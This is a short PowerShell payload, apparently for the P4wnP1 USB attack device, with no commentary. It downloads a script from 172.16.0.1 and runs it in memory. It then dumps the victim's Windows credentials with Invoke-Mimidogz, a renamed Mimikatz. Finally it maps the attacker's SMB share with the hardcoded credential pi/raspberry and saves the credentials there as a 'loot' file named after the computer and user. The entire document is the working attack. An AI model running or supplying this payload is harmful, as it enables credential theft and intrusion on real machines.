IEX (New-Object Net.WebClient).DownloadString('http://172.16.0.1:8000/md.ps1');$o = Invoke-Mimidogz -DumpCred

$filename="\\MAME82-P4WNP1\P4wnP1\payloads\loot\"+$env:COMPUTERNAME+"_"+$env:USERNAME+".txt"

net use \\MAME82-P4WNP1\P4wnP1 raspberry /USER:pi

$o | Out-File $filename